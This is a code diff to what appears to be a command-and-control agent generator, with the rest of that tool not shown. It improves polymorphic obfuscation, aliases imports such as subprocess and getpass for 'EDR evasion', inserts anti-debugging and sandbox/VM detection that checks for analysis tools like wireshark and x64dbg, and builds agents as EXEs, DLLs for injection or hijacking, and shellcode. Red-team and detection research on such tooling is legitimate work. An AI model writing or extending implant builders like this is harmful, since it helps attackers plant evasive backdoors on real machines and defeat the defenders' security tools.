@@ -32,8 +32,9 @@ class AgentGenerator:
 
     def generate_junk_code(self) -> str:
         """Generate realistic looking but unused code (no comments for OPSEC)"""
+        var = self.random_var_name()
         junk_patterns = [
-            f"def {self.random_var_name()}():\n    {self.random_var_name()} = {random.randint(0, 1000)}\n    return {self.random_var_name()}",
+            f"def {self.random_var_name()}():\n    {var} = {random.randint(0, 1000)}\n    return {var}",
             f"{self.random_var_name()} = {random.randint(0, 1000)}",
             f"'''{self.random_string(20)}'''",
             f"{self.random_var_name()} = lambda x: x * {random.randint(1, 10)}",
@@ -193,25 +194,35 @@ class AgentGenerator:
             'calculate_sleep_time': self.random_var_name(),
         }
 
-        # Replace function names
-        for original, obfuscated in func_mappings.items():
-            content = re.sub(rf'\b{original}\b', obfuscated, content)
+        # Build combined regex for function names (single pass)
+        func_pattern = re.compile(r'\b(' + '|'.join(re.escape(k) for k in func_mappings) + r')\b')
+        content = func_pattern.sub(lambda m: func_mappings[m.group(0)], content)
 
-        # Randomize variable names in key areas
-        var_patterns = {
-            r'\bmetadata\b': self.random_var_name(),
-            r'\bmessage\b': self.random_var_name(),
-            r'\bcommand\b': self.random_var_name(),
-            r'\boutput\b': self.random_var_name(),
-            r'\bencrypted\b': self.random_var_name(),
-            r'\bdecrypted\b': self.random_var_name(),
-            r'\bwebsocket\b': self.random_var_name(),
+        # Randomize variable names in key areas (combined into two passes)
+        var_replacements = {
+            'metadata': self.random_var_name(),
+            'message': self.random_var_name(),
+            'command': self.random_var_name(),
+            'output': self.random_var_name(),
+            'encrypted': self.random_var_name(),
+            'decrypted': self.random_var_name(),
+            'websocket': self.random_var_name(),
         }
+        var_pattern = re.compile(r'\b(' + '|'.join(re.escape(k) for k in var_replacements) + r')\b(?=\s*[=:]|[\s\.])')
+        content = var_pattern.sub(lambda m: var_replacements[m.group(1)], content)
 
-        for pattern, replacement in var_patterns.items():
-            # Only replace variable assignments/usages, not imports
-            content = re.sub(pattern + r'(?=\s*[=:])', replacement, content)
-            content = re.sub(pattern + r'(?=[\s\.])', replacement, content)
+        # Obfuscate import names (EDR evasion)
+        import_aliases = {
+            'websockets': self.random_var_name(),
+            'subprocess': self.random_var_name(),
+            'platform': self.random_var_name(),
+            'getpass': self.random_var_name(),
+        }
+        for original, alias in import_aliases.items():
+            # Replace 'import X' with 'import X as alias' and all usages
+            content = re.sub(rf'^(import {original})\s*$', rf'import {original} as {alias}', content, flags=re.MULTILINE)
+            # Replace usages of the module name (e.g., platform.system())
+            content = re.sub(rf'\b{original}\.', f'{alias}.', content)
 
         # Obfuscate string literals (EDR evasion)
         strings_to_obfuscate = [
@@ -271,7 +282,6 @@ class AgentGenerator:
         # Add anti-debugging checks (EDR evasion)
         check_func = self.random_var_name()
         anti_debug = f'''
-# Anti-debugging check
 def {check_func}():
     import sys as _sys_check
     if hasattr(_sys_check, 'gettrace') and _sys_check.gettrace() is not None:
@@ -283,20 +293,36 @@ def {check_func}():
         # Insert near the top
         content = content.replace('#!/usr/bin/env python3', '#!/usr/bin/env python3\n' + anti_debug)
 
-        # Add timing checks (sandbox evasion)
-        time_alias = self.random_var_name()
-        start_var = self.random_var_name()
-        timing_check = f'''
-# Timing check for sandbox detection
-import time as {time_alias}
-{start_var} = {time_alias}.time()
-for _ in range(1000):
-    pass
-if {time_alias}.time() - {start_var} > 0.1:
-    import sys as _sys_time
-    _sys_time.exit(0)
+        # Add sandbox/VM detection (delay rather than exit to avoid killing agent on real VMs)
+        env_func = self.random_var_name()
+        delay_var = self.random_var_name()
+        sandbox_check = f'''
+def {env_func}():
+    import os as _os_env
+    import time as _time_env
+    {delay_var} = 0
+    try:
+        cpu_count = _os_env.cpu_count() or 1
+        if cpu_count < 2:
+            {delay_var} += 30
+    except Exception:
+        pass
+    try:
+        known_procs = ['vmsrvc', 'vmusrvc', 'vboxtray', 'vmtoolsd', 'wireshark', 'procmon', 'x64dbg', 'ollydbg', 'ida']
+        if hasattr(_os_env, 'popen'):
+            ps_out = _os_env.popen('tasklist 2>nul || ps aux 2>/dev/null').read().lower()
+            for proc in known_procs:
+                if proc in ps_out:
+                    {delay_var} += 15
+                    break
+    except Exception:
+        pass
+    if {delay_var} > 0:
+        _time_env.sleep({delay_var})
+
+{env_func}()
 '''
-        content = content.replace('#!/usr/bin/env python3', '#!/usr/bin/env python3\n' + timing_check)
+        content = content.replace('#!/usr/bin/env python3', '#!/usr/bin/env python3\n' + sandbox_check)
 
         # Strip all comments and docstrings for OPSEC
         content = self.strip_comments_and_docstrings(content)
@@ -414,7 +440,7 @@ def {cmd_func}(cmd):
 
     def generate_python_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                               beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
-                              obfuscate: bool = True, unique_key: bool = True, target_os: str = 'auto') -> str:
+                              obfuscate: bool = True, unique_key: bool = False, target_os: str = 'auto') -> str:
         """Generate Python agent with polymorphic obfuscation and OS-specific features
 
         Args:
@@ -593,6 +619,11 @@ def {cmd_func}(cmd):
                        export_name: str = None) -> str:
         """Compile Python agent to DLL for DLL injection/hijacking
 
+        NOTE: PyInstaller does not natively produce valid DLLs. This generates
+        a PyInstaller executable renamed to .dll with a rundll32-compatible
+        wrapper script. For true DLL output, compile on Windows with py2exe
+        or use a C loader DLL that embeds the Python agent.
+
         Args:
             python_file: Path to Python file to compile
             arch: Target architecture (x86, x64)
@@ -608,8 +639,23 @@ def {cmd_func}(cmd):
 
             # Only Windows supports DLL compilation
             if sys.platform != 'win32':
-                print(f"[!] DLL compilation only supported on Windows (current: {sys.platform})")
-                print(f"[*] Generating DLL spec for cross-compilation...")
+                print(f"[!] DLL compilation requires Windows (current: {sys.platform})")
+                print(f"[!] PyInstaller cannot produce valid DLLs natively")
+                print(f"[*] Generating DLL wrapper source and spec for compilation on Windows...")
+                # Generate the wrapper source for later compilation on Windows
+                wrapper_path = self.output_dir / f"{unique_name}_dll_wrapper.py"
+                with open(python_file, 'r') as f:
+                    agent_code = f.read()
+                wrapper_code = f'''# DLL Wrapper - Compile on Windows with: pyinstaller --onefile {wrapper_path.name}
+# Then rename .exe to .dll for rundll32 usage
+# For true DLL: use py2exe or a C loader
+{agent_code}
+'''
+                with open(wrapper_path, 'w') as f:
+                    f.write(wrapper_code)
+                print(f"[*] DLL wrapper saved: {wrapper_path}")
+                print(f"[*] To compile: transfer to Windows and run PyInstaller")
+                return str(wrapper_path)
 
             dll_path = self.output_dir / f"{unique_name}_{arch}.dll"
 
@@ -795,6 +841,16 @@ def _main():
             args.extend([
                 '--runtime-tmpdir', '.',  # Use current dir for runtime
             ])
+
+            # Cross-compilation warning
+            current_platform = sys.platform
+            if current_platform != 'win32' and (python_file.endswith('_windows.py') or 'windows' in python_file):
+                print(f"[!] Warning: Cross-compilation not supported by PyInstaller")
+                print(f"[!] Current platform: {current_platform}. Executable will only run on {current_platform}")
+                print(f"[*] For Windows EXE, compile the Python source on a Windows machine")
+            elif current_platform == 'win32' and ('linux' in python_file or 'macos' in python_file):
+                print(f"[!] Warning: Cross-compilation not supported by PyInstaller")
+                print(f"[*] For Linux/macOS binaries, compile on the target platform")
 
             # Architecture-specific notes
             if arch == 'x86':
@@ -1079,7 +1135,7 @@ unsigned int {var_name}_len = {len(data)};
                      beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
                      compile_exe: bool = False, compile_dll: bool = False, generate_shellcode: bool = False,
                      shellcode_format: str = 'raw', architectures: list = None, upx: bool = True, icon: str = None,
-                     target_os: str = 'auto', generate_multi_os: bool = False) -> dict:
+                     target_os: str = 'auto', generate_multi_os: bool = False, unique_key: bool = False) -> dict:
         """Generate agents for all platforms
 
         Args:
@@ -1115,7 +1171,7 @@ unsigned int {var_name}_len = {len(data)};
                 results[os_key] = self.generate_python_agent(
                     c2_host, c2_port, encryption_key,
                     beacon_mode, beacon_interval, beacon_jitter,
-                    target_os=os_type
+                    unique_key=unique_key, target_os=os_type
                 )
                 if beacon_mode:
                     jitter_desc = f" ±{beacon_jitter}%" if beacon_jitter > 0 else ""
@@ -1791,9 +1847,11 @@ if __name__ == '__main__':
 
     generator = AgentGenerator(args.output)
     results = generator.generate_all(
-        args.host, args.port, args.key, args.beacon, args.interval, args.jitter,
-        args.compile, args.dll, args.shellcode, args.format,
-        args.arch, not args.no_upx, args.icon, args.target_os, args.multi_os
+        c2_host=args.host, c2_port=args.port, encryption_key=args.key,
+        beacon_mode=args.beacon, beacon_interval=args.interval, beacon_jitter=args.jitter,
+        compile_exe=args.compile, compile_dll=args.dll, generate_shellcode=args.shellcode,
+        shellcode_format=args.format, architectures=args.arch, upx=not args.no_upx,
+        icon=args.icon, target_os=args.target_os, generate_multi_os=args.multi_os
     )
 
     print("\n" + "="*60)
